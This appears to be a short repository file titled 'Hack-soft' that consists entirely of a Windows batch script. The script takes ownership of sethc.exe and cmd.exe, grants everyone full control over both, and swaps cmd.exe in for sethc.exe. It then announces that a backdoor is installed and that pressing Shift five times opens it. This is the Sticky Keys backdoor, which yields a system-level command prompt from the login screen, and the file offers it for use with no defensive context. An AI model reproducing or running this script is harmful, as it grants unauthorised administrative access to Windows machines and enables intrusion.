# Hack-soft
Hacking code
@echo off

takeown /f "C:\Windows\System32\sethc.exe"

takeown /f "C:\Windows\System32\cmd.exe"

icacls "C:\Windows\System32\sethc.exe" /grant everyone:F

icacls "C:\Windows\System32\cmd.exe" /grant everyone:F

md "C:/backdoorbackup"

copy "C:\Windows\System32\sethc.exe" "C:/backdoorbackup/sethc.exe"

del "C:\Windows\System32\sethc.exe"

copy "C:\Windows\System32\cmd.exe" "C:\Windows\System32\sethc.exe"

cls

echo backdoor installed. press shift five times or (alt+shift+prtsc) to open.

pause
